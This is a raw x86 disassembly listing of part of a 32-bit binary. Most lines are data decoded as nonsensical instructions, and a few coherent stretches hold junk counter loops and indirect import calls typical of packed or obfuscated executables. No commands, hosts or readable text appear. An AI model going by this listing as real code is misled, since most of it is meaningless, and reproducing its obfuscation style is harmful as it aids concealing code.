  419862:	int3   
  419863:	in     eax,dx
  419864:	xchg   ebp,eax
  419865:	xor    bl,BYTE PTR [edi+0x1]
  419868:	sbb    al,0x57
  41986a:	jno    0x4198cd
  41986c:	lds    edx,FWORD PTR [eax]
  41986e:	jne    0x4197f6
  419870:	sub    eax,edx
  419872:	lods   eax,DWORD PTR ds:[esi]
  419873:	int3   
  419874:	aad    0xa6
  419876:	sbb    ecx,DWORD PTR [edi-0x10]
  419879:	bound  esi,QWORD PTR [ebp+ebp*4+0x2a1438b]
  419880:	pop    ecx
  419881:	test   al,0xeb
  419883:	jg     0x4198b3
  419885:	pop    eax
  419886:	xchg   edx,eax
  419887:	div    DWORD PTR [ebx+0x7]
  41988a:	jb     0x419840
  41988c:	call   0xdca27dd5
  419891:	push   esp
  419892:	cli    
  419893:	fs popa 
  419895:	test   al,0x91
  419897:	loop   0x41981b
  419899:	add    bl,dh
  41989b:	fs jmp 0x73c1fd31
  4198a1:	ja     0x419859
  4198a3:	ins    DWORD PTR es:[edi],dx
  4198a4:	fnsave [eax+edx*8+0x5a]
  4198a8:	push   esi
  4198a9:	fld    QWORD PTR [ebx-0x23]
  4198ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ad:	fcomp  DWORD PTR [esi-0x1ae91d0]
  4198b3:	aam    0x78
  4198b5:	mov    al,ds:0xfe8e2d42
  4198ba:	push   0xffffff9a
  4198bc:	cmp    ebp,DWORD PTR [edx-0x31187e73]
  4198c2:	push   ebp
  4198c3:	aad    0x63
  4198c5:	jnp    0x419941
  4198c7:	rcr    DWORD PTR gs:[eax+0x13e4cfba],0xc2
  4198cf:	aad    0x3c
  4198d1:	and    bl,cl
  4198d3:	xor    eax,0x942b6b5d
  4198d8:	or     BYTE PTR ds:0xf680234f,ah
  4198de:	inc    esp
  4198df:	dec    eax
  4198e0:	or     eax,0x4eab61a7
  4198e5:	push   ebx
  4198e6:	es stos DWORD PTR es:[edi],eax
  4198e8:	sub    ch,bh
  4198ea:	sar    DWORD PTR [ecx+0x76],cl
  4198ed:	or     eax,0x93f2790d
  4198f2:	call   0xd68cf76
  4198f7:	cdq    
  4198f8:	push   ecx
  4198f9:	fstp   QWORD PTR [ebx-0x37]
  4198fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198fd:	(bad)  
  4198fe:	dec    edx
  4198ff:	adc    ebx,DWORD PTR [eax+eax*1+0x38]
  419903:	stos   BYTE PTR es:[edi],al
  419904:	sub    eax,0x410230ff
  419909:	inc    eax
  41990a:	mov    edx,0x9405aee8
  41990f:	cdq    
  419910:	dec    edi
  419911:	mov    ah,0x7e
  419913:	js     0x419935
  419915:	push   ebx
  419916:	jg     0x419922
  419918:	push   esp
  419919:	pushf  
  41991a:	push   ecx
  41991b:	mov    bh,0x46
  41991d:	lods   eax,DWORD PTR ds:[esi]
  41991e:	loopne 0x4198c7
  419920:	pushf  
  419921:	push   ebx
  419922:	push   cs
  419923:	xor    eax,0x173818e6
  419928:	or     BYTE PTR [esi+ebx*1],bl
  41992b:	jge    0x4198c0
  41992d:	sbb    ch,ch
  41992f:	push   ecx
  419930:	aaa    
  419931:	je     0x419973
  419933:	loope  0x419951
  419935:	rcr    BYTE PTR [edx],1
  419937:	repnz call 0x4369:0xc72172c1
  41993f:	xchg   ebx,eax
  419940:	jno    0x41990f
  419942:	xor    BYTE PTR [edi+0x5630b84e],dh
  419948:	out    0x35,al
  41994a:	push   ebp
  41994b:	and    al,0x1f
  41994d:	call   0xee27:0xcc15b987
  419954:	cmp    DWORD PTR [edx-0x47],ebp
  419957:	sbb    al,0x2c
  419959:	inc    esp
  41995a:	xor    al,0x14
  41995c:	mov    al,ds:0x8bc1f259
  419961:	and    BYTE PTR [ecx],bh
  419963:	fbld   TBYTE PTR [ebp-0x69]
  419966:	fwait
  419967:	imul   esi,DWORD PTR [esi-0x5cc66791],0xa66d39a1
  419971:	in     eax,dx
  419972:	and    ecx,DWORD PTR [eax]
  419974:	jg     0x4199f0
  419976:	xchg   BYTE PTR [eax-0x2f],cl
  419979:	mov    ds:0x827954e,eax
  41997e:	mov    ecx,0x4e50a3db
  419983:	mov    ds:0x6b82dc9c,al
  419988:	xchg   esi,eax
  419989:	dec    edx
  41998a:	iret   
  41998b:	repz inc ebp
  41998d:	fimul  WORD PTR [ebp+ebx*8-0x73d67a44]
  419994:	cmp    bh,0xeb
  419997:	ins    BYTE PTR es:[edi],dx
  419998:	mov    bl,0x72
  41999a:	jno    0x4199a6
  41999c:	fsubr  QWORD PTR [ebx-0x1136ea7]
  4199a2:	push   ebx
  4199a3:	jg     0x419972
  4199a5:	in     eax,dx
  4199a6:	daa    
  4199a7:	sahf   
  4199a8:	add    BYTE PTR [ecx+0x48e214fc],dh
  4199ae:	sbb    BYTE PTR [ecx-0x45],bl
  4199b1:	retf   0x3dbf
  4199b4:	dec    ecx
  4199b5:	and    DWORD PTR [edi-0x24],edi
  4199b8:	fs idiv bl
  4199bb:	cs jbe 0x4199f2
  4199be:	push   eax
  4199bf:	sub    edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42af8d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42b001,0x12
  4199e0:	cmp    DWORD PTR ds:0x42b001,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42b001,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42b001
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42b001,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42aee5,0x1b
  419a31:	cmp    DWORD PTR ds:0x42aee5,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42aee5,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42aee5,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42aee5
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42aee5,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42aee5
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42aee5,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42af85,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42afc9,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42af35
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42afbd,0x42af31
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42b001,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42b001
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42b001,eax
  419ac8:	cmp    DWORD PTR ds:0x42b001,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42b001,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42af85
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42af4d
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42afc5
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x35
  419b14:	rcr    DWORD PTR [esi-0x30],cl
  419b17:	ror    bh,1
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b4c
  419b20:	in     eax,dx
  419b21:	popf   
  419b22:	push   es
  419b23:	test   al,0x49
  419b25:	fild   WORD PTR [ebx+edi*4-0x46dc7b38]
  419b2c:	xchg   BYTE PTR [ecx+0x5c],ch
  419b2f:	dec    ebx
  419b30:	cdq    
  419b31:	(bad)  
  419b32:	jmp    0x419abf
  419b34:	call   0xcf9e4dd8
  419b39:	xchg   edi,eax
  419b3a:	aad    0xc5
  419b3c:	adc    DWORD PTR [ecx-0x648ec436],esi
  419b42:	arpl   WORD PTR [edi],bp
  419b44:	sbb    DWORD PTR [esi],eax
  419b46:	jno    0x419adc
  419b48:	or     ch,cl
  419b4a:	bound  ebx,QWORD PTR [eax*1+0x4f8cae3b]
  419b51:	xchg   ecx,eax
  419b52:	(bad)  
  419b54:	sbb    cl,BYTE PTR [ebx-0x2981d2a0]
  419b5a:	enter  0x9c19,0x9
  419b5e:	out    dx,eax
  419b5f:	sbb    al,0x99
  419b61:	dec    esi
  419b62:	nop
  419b63:	dec    eax
  419b64:	sub    BYTE PTR [esi-0x75ee74cc],ah
  419b6a:	xor    dh,dh
  419b6c:	and    BYTE PTR [ebp+0x3f],bh
  419b6f:	(bad)  
  419b71:	cdq    
  419b72:	mov    esi,0x650dd61e
  419b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b78:	jae    0x419be5
  419b7a:	and    edi,ebx
  419b7c:	inc    esp
  419b7d:	and    ch,BYTE PTR [ebx+0x65]
  419b80:	pushf  
  419b81:	push   edi
  419b82:	pop    ecx
  419b83:	inc    ecx
  419b84:	aaa    
  419b85:	enter  0x937f,0x40
  419b89:	cmp    edi,DWORD PTR [edx-0x3a29579d]
  419b8f:	dec    esi
  419b90:	fldenv [ebx-0x51]
  419b93:	sbb    ah,BYTE PTR [ecx+eiz*2]
  419b96:	in     eax,dx
  419b97:	inc    eax
  419b98:	jecxz  0x419ba2
  419b9a:	inc    esp
  419b9b:	mov    ecx,0x5a5794cb
  419ba0:	and    DWORD PTR ds:0x2116eb7,ecx
  419ba6:	fwait
  419ba7:	and    DWORD PTR [edx],ebp
  419ba9:	popa   
  419baa:	js     0x419bfc
  419bac:	cdq    
  419bad:	aaa    
  419bae:	ret    
  419baf:	shl    BYTE PTR [ebx],cl
  419bb1:	sbb    cl,ch
  419bb3:	mov    dh,0x6c
  419bb5:	(bad)  
  419bb6:	and    DWORD PTR [ebp+0x0],ebx
  419bb9:	add    dl,BYTE PTR [eax+ecx*2-0x8ab8e7c]
  419bc0:	fdiv   st,st(3)
  419bc2:	mov    ebx,0x3dd04de1
  419bc7:	mov    ah,0x90
  419bc9:	or     al,0x7e
  419bcb:	or     DWORD PTR [ebx-0x6d3b7296],ebp
  419bd1:	push   edi
  419bd2:	dec    ebp
  419bd3:	sub    DWORD PTR [ecx+edi*1],0x79a796f6
  419bda:	call   FWORD PTR [ecx+0xc]
  419bdd:	mov    ah,0x8f
  419bdf:	ins    DWORD PTR es:[edi],dx
  419be0:	addr16 popf 
  419be2:	fs int3 
  419be4:	imul   ecx,edx,0x5e
  419be7:	lds    ebx,FWORD PTR [ecx]
  419be9:	mov    dl,0x4a
  419beb:	mov    esi,0x84920169
  419bf0:	(bad)  
  419bf2:	(bad)  
  419bf3:	adc    dl,BYTE PTR [ebx-0xd94e7c1]
  419bf9:	lds    esp,FWORD PTR [eax]
  419bfb:	jle    0x419bdb
  419bfd:	jmp    0xee55:0xad73cda5
  419c04:	rcl    BYTE PTR [ecx-0x235da79d],cl
  419c0a:	(bad)  
  419c0b:	xchg   ebp,eax
  419c0c:	outs   dx,BYTE PTR ds:[esi]
  419c0d:	lods   al,BYTE PTR ds:[esi]
  419c0e:	push   edi
  419c0f:	cwde   
  419c10:	xchg   DWORD PTR [ebx],edi
  419c12:	sbb    edi,DWORD PTR [eax+esi*8]
  419c15:	cmp    eax,0xa6ea110c
  419c1a:	sbb    eax,0x47d2fca6
  419c1f:	(bad)  
  419c20:	call   0xb0dd:0x30a7c636
  419c27:	fsubr  st,st(6)
  419c29:	mov    ah,0xe7
  419c2b:	(bad)  
  419c2c:	lea    ecx,[eax-0x4813fd8f]
  419c32:	fwait
  419c33:	jle    0x419c6c
  419c35:	add    dh,al
  419c37:	mov    al,ds:0x965643fa
  419c3c:	popa   
  419c3d:	rcr    DWORD PTR [ebx],0xfe
  419c40:	bound  edx,QWORD PTR [edx+0x43]
  419c43:	xor    BYTE PTR [ebx],0x97
  419c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c47:	test   DWORD PTR [ebx+0x1d0f029c],esp
  419c4d:	xchg   edx,eax
  419c4e:	aaa    
  419c4f:	or     BYTE PTR [edi+0x16],ah
  419c52:	sbb    eax,0x389ccb29
  419c57:	ins    BYTE PTR es:[edi],dx
  419c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c59:	stc    
  419c5a:	mov    edi,0x7970f841
  419c5f:	add    dl,cl
  419c61:	imul   edi,DWORD PTR [ecx],0xffffff92
  419c64:	loope  0x419cd8
  419c66:	sub    DWORD PTR [ebp+0x7f2382e4],ecx
  419c6c:	dec    esi
  419c6d:	mov    edx,esp
  419c6f:	test   eax,0xce0f3d38
  419c74:	dec    esp
  419c75:	dec    edx
  419c76:	rcr    DWORD PTR ds:0x88e0f078,0x19
  419c7d:	cmp    eax,0xc711f4ca
  419c82:	jo     0x419c59
  419c84:	(bad)  
  419c85:	sbb    BYTE PTR [ebx-0x5b],bl
  419c88:	mov    ah,0x9a
  419c8a:	enter  0x10b3,0xfe
  419c8e:	sti    
  419c8f:	leave  
  419c90:	push   ebx
  419c91:	in     eax,0x77
  419c93:	data16 mov dl,0x66
  419c96:	repz mov dh,0x39
  419c99:	(bad)  
  419c9b:	add    ah,BYTE PTR [ebx-0x25ed9d74]
  419ca1:	test   BYTE PTR [ebx+0x1cbaa52f],al
  419ca7:	mov    edi,DWORD PTR [esi-0xc]
  419caa:	lods   al,BYTE PTR ds:[esi]
  419cab:	adc    eax,0xfc782db0
  419cb0:	(bad)  
  419cb1:	fsub   DWORD PTR [ebx-0x288d11d]
  419cb7:	add    DWORD PTR [ecx-0x48],esp
  419cba:	xchg   esi,eax
  419cbb:	shl    BYTE PTR [edi-0x19eb90],0xe6
  419cc2:	xor    eax,0xd2d7fa89
  419cc7:	xor    eax,0x245eb9d7
  419ccc:	and    ch,0x53
  419ccf:	mov    ?,WORD PTR [edi-0x759385a0]
  419cd5:	arpl   WORD PTR [ecx+0x61],bx
  419cd8:	adc    eax,DWORD PTR [edi+0x7c]
  419cdb:	inc    ebx
  419cdc:	das    
  419cdd:	mov    ds:0x64e858bf,eax
  419ce2:	add    edi,DWORD PTR [ebx-0x50]
  419ce5:	aam    0x5b
  419ce7:	adc    al,0x4b
  419ce9:	jecxz  0x419c73
  419ceb:	leave  
  419cec:	mov    eax,ds:0x2c60e4c0
  419cf1:	cmp    DWORD PTR [ebp+0x6a7ef88b],edx
  419cf7:	out    dx,eax
  419cf8:	mov    esp,DWORD PTR [ebx]
  419cfa:	xor    esi,DWORD PTR [ebx+0x3137b327]
  419d00:	and    al,0xc6
  419d02:	sbb    dh,BYTE PTR [eax]
  419d04:	popa   
  419d05:	pushf  
  419d06:	sub    eax,DWORD PTR [edi-0x78b4fe8f]
  419d0c:	mov    ecx,DWORD PTR [edx-0x43dc18bc]
  419d12:	fisttp DWORD PTR [edi+0x40]
  419d15:	pop    ds
  419d16:	cmp    eax,0x5e5389a9
  419d1b:	sub    dl,BYTE PTR [edi-0x160a9fed]
  419d21:	icebp  
  419d22:	mov    ch,0x45
  419d24:	cmc    
  419d25:	mov    bl,0xb3
  419d27:	and    eax,0xa472330c
  419d2c:	ins    DWORD PTR es:[edi],dx
  419d2d:	jbe    0x419d2f
  419d2f:	pop    esi
  419d30:	inc    ecx
  419d31:	sub    eax,0xdb98b6b2
  419d36:	adc    BYTE PTR [ebx-0x7bf01fbb],cl
  419d3c:	mov    DWORD PTR [ebx],ecx
  419d3e:	add    BYTE PTR [eax],al
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42afb9,0x42aeed
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42b009,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42afbd,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	pop    es
  419d7d:	add    ah,ah
  419d7f:	(bad)  
  419d80:	call   0x10ba1d52
  419d85:	jle    0x419dff
  419d87:	js     0x419d6b
  419d89:	mov    dh,0xe6
  419d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d8c:	ins    BYTE PTR es:[edi],dx
  419d8d:	in     eax,0xcb
  419d8f:	cdq    
  419d90:	or     al,0x5f
  419d92:	test   edi,edi
  419d94:	xchg   esp,eax
  419d95:	bound  esp,QWORD PTR [ecx]
  419d97:	mov    esp,es
  419d99:	stos   BYTE PTR es:[edi],al
  419d9a:	pop    edi
  419d9b:	pop    edi
  419d9c:	mov    ch,0x11
  419d9e:	icebp  
  419d9f:	scas   al,BYTE PTR es:[edi]
  419da0:	pop    esi
  419da1:	adc    esi,ebx
  419da3:	or     BYTE PTR [ecx+0x38206b84],bl
  419da9:	adc    eax,0xcbb355b2
  419dae:	xchg   ecx,eax
  419daf:	adc    eax,0xe0b28307
  419db4:	test   eax,0x3995a47e
  419db9:	cmc    
  419dba:	jecxz  0x419dca
  419dbc:	mov    esp,0xb5b94803
  419dc1:	adc    eax,0x60973c2c
  419dc6:	fs in  al,dx
  419dc8:	cmc    
  419dc9:	add    DWORD PTR [ebx+0x37],0xffffffcd
  419dcd:	icebp  
  419dce:	(bad)  
  419dd0:	fdiv   DWORD PTR [ebx+0x265dae38]
  419dd6:	stc    
  419dd7:	and    BYTE PTR ds:0xc1f090ef,ch
  419ddd:	dec    ebx
  419dde:	and    al,0xac
  419de0:	ins    DWORD PTR es:[edi],dx
  419de1:	add    ebp,DWORD PTR [esi-0x34]
  419de4:	push   0xffffff9a
  419de6:	xor    BYTE PTR [ecx],bh
  419de8:	adc    ebp,eax
  419dea:	xchg   DWORD PTR [esi-0x66c1e54a],ebx
  419df0:	test   DWORD PTR [edx],0x30e76048
  419df6:	mov    bh,0xa3
  419df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df9:	bnd jne 0x419d8b
  419dfc:	cmp    DWORD PTR [ebp+0x74],eax
  419dff:	dec    edi
  419e00:	adc    esp,DWORD PTR [ecx+0x6]
  419e03:	lods   eax,DWORD PTR ds:[esi]
  419e04:	icebp  
  419e05:	pop    ebp
  419e06:	push   DWORD PTR [ecx]
  419e08:	out    0x9c,eax
  419e0a:	pusha  
  419e0b:	in     al,dx
  419e0c:	xor    DWORD PTR [ecx],esp
  419e0e:	xlat   BYTE PTR ds:[ebx]
  419e0f:	mov    eax,0x20cabc21
  419e14:	add    dl,al
  419e16:	fisttp QWORD PTR [ebx+ecx*1-0x40b5e753]
  419e1d:	sbb    ebx,esi
  419e1f:	clc    
  419e20:	or     dl,0x32
  419e23:	fldcw  WORD PTR [ecx-0x1f6ba3af]
  419e29:	push   esi
  419e2a:	out    0x77,eax
  419e2c:	cli    
  419e2d:	sub    esi,ebx
  419e2f:	push   0x52c620c4
  419e34:	jne    0x419e80
  419e36:	sbb    eax,0x9b9d9380
  419e3b:	lock mov edx,DWORD PTR [ecx]
  419e3e:	in     al,dx
  419e3f:	inc    eax
  419e40:	mov    cl,0x92
  419e42:	jecxz  0x419e2d
  419e44:	ins    BYTE PTR es:[edi],dx
  419e45:	xor    DWORD PTR [edx-0x61],eax
  419e48:	call   0xd3882f24
  419e4d:	jb     0x419e9e
  419e4f:	sub    ax,0x1754
  419e53:	xchg   edx,eax
  419e54:	ficomp WORD PTR [ecx+0x7c]
  419e57:	ret    0x209d
  419e5a:	(bad)  
  419e5b:	jo     0x419eaa
  419e5d:	jb     0x419edd
  419e5f:	dec    ecx
  419e60:	mov    WORD PTR [ebp-0x53],es
  419e63:	addr16 out 0x74,eax
  419e66:	cmp    bh,bl
  419e68:	inc    esp
  419e69:	lods   al,BYTE PTR ds:[esi]
  419e6a:	inc    esi
  419e6b:	sub    dl,0x19
  419e6e:	dec    ecx
  419e6f:	lahf   
  419e70:	call   0xe291f766
  419e75:	pop    ebp
  419e76:	mov    ebx,0x463f0376
  419e7b:	lods   al,BYTE PTR ds:[esi]
  419e7c:	nop
  419e7d:	adc    al,0xb8
  419e7f:	jmp    0x419e91
  419e81:	inc    ecx
  419e82:	cmc    
  419e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e84:	mov    ch,0x63
  419e86:	add    ecx,DWORD PTR [ebx+ebx*4]
  419e89:	adc    BYTE PTR [esi-0x78],al
  419e8c:	sub    ebp,DWORD PTR [ebx]
  419e8e:	ja     0x419e2d
  419e90:	mov    WORD PTR [eax],gs
  419e92:	lods   eax,DWORD PTR ds:[esi]
  419e93:	add    eax,0x813592d4
  419e98:	push   ecx
  419e99:	ins    BYTE PTR es:[edi],dx
  419e9a:	sar    DWORD PTR [ebp-0x72eb3c6b],0xe1
  419ea1:	sar    DWORD PTR [ebx-0x45cb954f],1
  419ea7:	sub    al,0x52
  419ea9:	pushf  
  419eaa:	xor    DWORD PTR [ecx+0x711d4199],ebx
  419eb0:	pop    es
  419eb1:	out    0x8a,al
  419eb3:	dec    ebx
  419eb4:	mov    ah,0xb4
  419eb6:	sar    edi,0x71
  419eb9:	inc    ebp
  419eba:	imul   esi,DWORD PTR [ecx-0x6b3e3234],0x1ed7f81a
  419ec4:	xchg   BYTE PTR [edx+0x55],bl
  419ec7:	dec    edi
  419ec8:	cmp    BYTE PTR [edi-0x51],bl
  419ecb:	xor    eax,0x347793d6
  419ed0:	xor    eax,0x78cc92d8
  419ed5:	mov    cl,cl
  419ed7:	adc    eax,0xd8ad64e0
  419edc:	sbb    al,0x72
  419ede:	mov    edi,0xf23e394
  419ee3:	or     BYTE PTR [edx-0x62],ah
  419ee6:	test   al,0x59
  419ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee9:	or     BYTE PTR [ebx-0x26],al
  419eec:	retf   
  419eed:	mov    esp,0x6f0166ff
  419ef2:	bnd jle 0x419f1f
  419ef5:	mov    esp,0xe2740cb3
  419efa:	pop    ebp
  419efb:	mov    ebx,0x7b4338bc
  419f00:	pop    ds
  419f01:	les    ebx,FWORD PTR [ecx+0x4d032009]
  419f07:	xor    ebp,DWORD PTR ds:0xa4f3fb00
  419f0d:	mov    DWORD PTR [ecx],0x7a69989f
  419f13:	push   0xf5f2db64
  419f18:	inc    esp
  419f19:	addr16 enter 0xed53,0x60
  419f1e:	push   0x45
  419f20:	cli    
  419f21:	retf   
  419f22:	mov    cl,0xb6
  419f24:	pop    ebx
  419f25:	gs and eax,0xde024786
  419f2b:	xlat   BYTE PTR ds:[ebx]
  419f2c:	sar    BYTE PTR [esi-0x38],0x28
  419f30:	scas   eax,DWORD PTR es:[edi]
  419f31:	mov    dh,0x87
  419f33:	xchg   DWORD PTR [edx-0x559a35f7],esp
  419f39:	mov    cl,0xa8
  419f3b:	cld    
  419f3c:	pop    eax
  419f3d:	pop    ebx
  419f3e:	mov    esi,0x7bcbae6b
  419f43:	cmp    BYTE PTR [ebx+eax*2+0x38ef3cb7],0x20
  419f4b:	sub    al,0xe2
  419f4d:	mov    dh,0xb1
  419f4f:	push   ss
  419f50:	mov    dh,0x36
  419f52:	repz xchg edi,eax
  419f54:	les    edi,FWORD PTR [esi]
  419f56:	(bad)  
  419f57:	and    BYTE PTR [ecx],ch
  419f59:	mov    edi,0x1ef864b1
  419f5e:	out    0x55,al
  419f60:	test   DWORD PTR ds:0xaeb5d10e,ebx
  419f66:	ret    
  419f67:	jmp    0x146a:0xca411b67
  419f6e:	jne    0x419fca
  419f70:	mov    ah,0x28
  419f72:	rcl    BYTE PTR [edx-0x36d10cfd],cl
  419f78:	mov    dl,0xa6
  419f7a:	cmp    eax,0x2e09dfa8
  419f7f:	aas    
  419f80:	stc    
  419f81:	popf   
  419f82:	wrmsr  
  419f84:	rcl    edi,0xaf
  419f87:	jo     0x419fc5
  419f89:	sahf   
  419f8a:	scas   eax,DWORD PTR es:[edi]
  419f8b:	push   edi
  419f8c:	and    al,0xee
  419f8e:	push   ebx
  419f8f:	shl    DWORD PTR ss:[esi],cl
  419f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f93:	push   ebp
  419f94:	xchg   esp,eax
  419f95:	adc    BYTE PTR [edx],dl
  419f97:	cmp    BYTE PTR [eax+0x767db00e],ch
  419f9d:	push   ds
  419f9e:	mov    bh,0x3e
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42af45,0x42aee1
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42aff1,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42afb5,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x85
  419fdd:	xor    al,0xcf
  419fdf:	mov    ch,0x80
  419fe1:	sar    DWORD PTR [edi+0x78],cl
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x41a063
  419fe9:	mov    al,0x52
  419feb:	jne    0x419fd1
  419fed:	call   0xa6309f1c
  419ff2:	sbb    esi,eax
  419ff4:	in     eax,0xc2
  419ff6:	add    bl,0xec
  419ff9:	add    BYTE PTR [edx],bl
  419ffb:	jge    0x419f8a
  419ffd:	pop    ss
  419ffe:	sbb    BYTE PTR [edi+0x73],0xa5
  41a002:	add    edx,DWORD PTR [edi-0x1d]
  41a005:	stc    
  41a006:	xchg   ecx,eax
  41a007:	jecxz  0x41a038
  41a009:	fist   WORD PTR [ebx]
  41a00b:	xchg   ecx,eax
  41a00c:	adc    ebp,edx
  41a00e:	pop    esi
  41a010:	nop
  41a011:	loopne 0x41a06d
  41a013:	(bad)  
  41a014:	xor    eax,0x6c2327a6
  41a019:	in     eax,dx
  41a01a:	inc    ebp
  41a01b:	iret   
  41a01c:	icebp  
  41a01d:	loope  0x41a070
  41a01f:	test   BYTE PTR [edi+esi*1],dl
  41a022:	sub    bl,bl
  41a024:	in     eax,0xf5
  41a026:	mov    edx,DWORD PTR [ebp-0x58d666a3]
  41a02c:	push   eax
  41a02d:	or     ebp,DWORD PTR [eax]
  41a02f:	add    BYTE PTR [ecx-0x216b42c2],cl
  41a035:	adc    al,0x3c
  41a037:	push   ds
  41a038:	nop
  41a039:	xchg   BYTE PTR [ebx+0x33],bl
  41a03c:	pusha  
  41a03d:	test   BYTE PTR [ebx+ecx*1+0x6ef24254],bl
  41a044:	mov    bh,0xc
  41a046:	and    ebx,DWORD PTR ds:0x5300fdc7
  41a04c:	pop    es
  41a04d:	dec    esp
  41a04e:	ds jp  0x41a079
  41a051:	fsubr  DWORD PTR [edx-0x6]
  41a054:	rcr    bl,cl
  41a056:	push   es
  41a057:	mov    DWORD PTR ds:0x15911bcd,ebx
  41a05d:	xor    al,0xa5
  41a05f:	lea    esi,[eax+0x78d3b5bb]
  41a065:	ror    BYTE PTR [ebx+0x68b2c436],cl
  41a06b:	mov    esi,0xb2eac552
  41a070:	inc    esi
  41a071:	jmp    DWORD PTR [esi]
  41a073:	aad    0x51
  41a075:	mov    ds:0x93eccd7d,eax
  41a07a:	aad    0xfe
  41a07c:	iret   
  41a07d:	stos   DWORD PTR es:[edi],eax
  41a07e:	mov    ebx,DWORD PTR [ebx-0xf]
  41a081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a083:	shl    BYTE PTR [edi+0x377cf816],cl
  41a089:	xchg   ebp,eax
  41a08a:	or     BYTE PTR [eax+0x41],al
  41a08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a08e:	fnsave [esi-0xb8afdc7]
  41a094:	retf   
  41a095:	mov    al,0x8b
  41a097:	inc    esp
  41a098:	dec    esi
  41a099:	fwait
  41a09a:	mov    al,0x63
  41a09c:	jns    0x41a056
  41a09e:	sub    al,0x6b
  41a0a0:	div    dl
  41a0a2:	leave  
  41a0a3:	cmp    dh,BYTE PTR [ebx+esi*8]
  41a0a6:	jge    0x41a07f
  41a0a8:	into   
  41a0a9:	shl    DWORD PTR [ebp+ebp*2+0x5],1
  41a0ad:	(bad)  
  41a0ae:	jmp    0x17722d56
  41a0b3:	out    dx,al
  41a0b4:	cmp    al,dh
  41a0b6:	int3   
  41a0b7:	(bad)  
  41a0b8:	shl    BYTE PTR es:[ebx+0xfff0632],1
  41a0bf:	mov    bl,0x3c
  41a0c1:	out    0x54,eax
  41a0c3:	jle    0x41a078
  41a0c5:	ja     0x41a13d
